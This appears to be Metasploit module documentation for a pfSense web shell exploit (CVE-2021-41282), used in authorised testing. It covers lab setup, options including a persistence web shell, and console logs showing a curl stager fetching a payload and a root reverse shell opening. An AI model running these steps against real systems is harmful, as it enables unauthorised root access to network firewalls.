## Vulnerable Application

### Description

This module exploits an arbitrary file creation vulnerability in the pfSense HTTP interface
(CVE-2021-41282). The vulnerability affects versions <= 2.5.2 and can be exploited by an
authenticated user if they have the "WebCfg - Diagnostics: Routing tables" privilege.

This module uses the vulnerability to create a web shell and execute payloads with root privileges.

### Installation

Download an affected version's ISO. For example, pfSense 2.5.2 can be download here:

https://nyifiles.netgate.com/mirror/downloads/pfSense-CE-2.5.2-RELEASE-amd64.iso.gz

* Follow the [installation guide](https://docs.netgate.com/pfsense/en/latest/install/install-pfsense.html) to get an initial base install.
* Log into the web interface using the credentials `admin:pfsense`
* Run through the [setup wizard](https://docs.netgate.com/pfsense/en/latest/config/setup-wizard.html).

To test a user that *only* has the `WebCfg - Diagnostics: Routing tables` privilege, as an
`admin` create a new user. The add user interface is in the `System` -> `User Manager` page.
Select the `Add` user button and create the user. Once the user is created, edit the user
and `Add` an `Effective Privilege`. Only assign `WebCfg - Diagnostics: Routing tables`. Done!

## Verification Steps

* Follow the installation instructions above
* Do: `use exploit/unix/http/pfsense_diag_routes_webshell`
* Do: `set username <name>`
* Do: `set password <password>`
* Do: `set RHOST <ip>`
* Do: `check`
* Verify the remote target is flagged as vulnerable
* Do: `set LHOST <ip>`
* Do: `exploit`
* You should get a reverse shell

## Options

### TARGETURI

Specifies base URI. The default value is `/`.

### USERNAME

The username to log in to the pfSense web interface with. The default is `admin`.

### PASSWORD

The password to log in with. Set to `pfsense` by default.

### WEBSHELL_NAME

Allows the user to name the webshell. If the user doesn't provided a name then one will be automatically generated.
Set to `nil` by default.

### DELETE_WEBSHELL

Indicates if the web shell should be deleted after reverse shell is established. A user may want to leave behind a
web shell for persistence reasons. The default is `true`.

### Target 0

Target 0 is a `CMD_ARCH` reverse shell using openssl.

### Target 1

Target 1 is a `bsd/x64` reverse shell using the curl command stager.


## Scenarios

### pfSense 2.5.2. Reverse shell using openssl cmd_arch payload.

```
msf6 > use exploit/unix/http/pfsense_diag_routes_webshell
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set USERNAME diag_only
USERNAME => diag_only
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set RHOST 10.0.0.10
RHOST => 10.0.0.10
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > check

[!] This exploit may require manual cleanup of '/usr/local/www/HFkrB' on the target
[+] 10.0.0.10:80 - The target is vulnerable.
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Uploading webshell to /dgGNIYHKgUL.php
[*] Testing if web shell installation was successful
[+] Web shell installed at /dgGNIYHKgUL.php
[*] Executing BSD Dropper for bsd/x64/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/kDumgxJC
[*] Local IP: http://10.0.0.2:8080/kDumgxJC
[*] Client 10.0.0.10 (curl/7.76.1) requested /kDumgxJC
[*] Sending payload to 10.0.0.10 (curl/7.76.1)
[*] Command Stager progress - 100.00% done (109/109 bytes)
[+] Deleted /usr/local/www/hrCcgfpdiGhC
[+] Deleted /usr/local/www/dgGNIYHKgUL.php
[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.10:57590 ) at 2022-02-27 18:08:12 -0800
[*] Server stopped.

id
uid=0(root) gid=0(wheel) groups=0(wheel)
pwd
/usr/local/www
uname -a
FreeBSD pfSense.home.arpa 12.2-STABLE FreeBSD 12.2-STABLE fd0f54f44b5c(RELENG_2_5_0) pfSense  amd64
```

### pfSense 2.5.2. Reverse shell using bsd reverse shell and curl command stager.

```
msf6 > use exploit/unix/http/pfsense_diag_routes_webshell
[*] Using configured payload bsd/x64/shell_reverse_tcp
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set USERNAME diag_only
USERNAME => diag_only
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set PASSWORD labpass1
PASSWORD => labpass1
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set RHOST 10.0.0.10
RHOST => 10.0.0.10
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > check

[!] This exploit may require manual cleanup of '/usr/local/www/QEpijnAPnpu' on the target
[+] 10.0.0.10:80 - The target is vulnerable.
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(unix/http/pfsense_diag_routes_webshell) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Uploading webshell to /xsYZjKyayH.php
[*] Testing if web shell installation was successful
[+] Web shell installed at /xsYZjKyayH.php
[*] Executing BSD Dropper for bsd/x64/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/eUKIs9nMdZP2t
[*] Local IP: http://10.0.0.2:8080/eUKIs9nMdZP2t
[*] Client 10.0.0.10 (curl/7.76.1) requested /eUKIs9nMdZP2t
[*] Sending payload to 10.0.0.10 (curl/7.76.1)
[*] Command Stager progress - 100.00% done (114/114 bytes)
[+] Deleted /usr/local/www/MkTcoNc
[+] Deleted /usr/local/www/xsYZjKyayH.php
[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.10:1879 ) at 2022-02-27 17:55:51 -0800
[*] Server stopped.

id
uid=0(root) gid=0(wheel) groups=0(wheel)
whoami
root
pwd
/usr/local/www
uname -a
FreeBSD pfSense.home.arpa 12.2-STABLE FreeBSD 12.2-STABLE fd0f54f44b5c(RELENG_2_5_0) pfSense  amd64
```
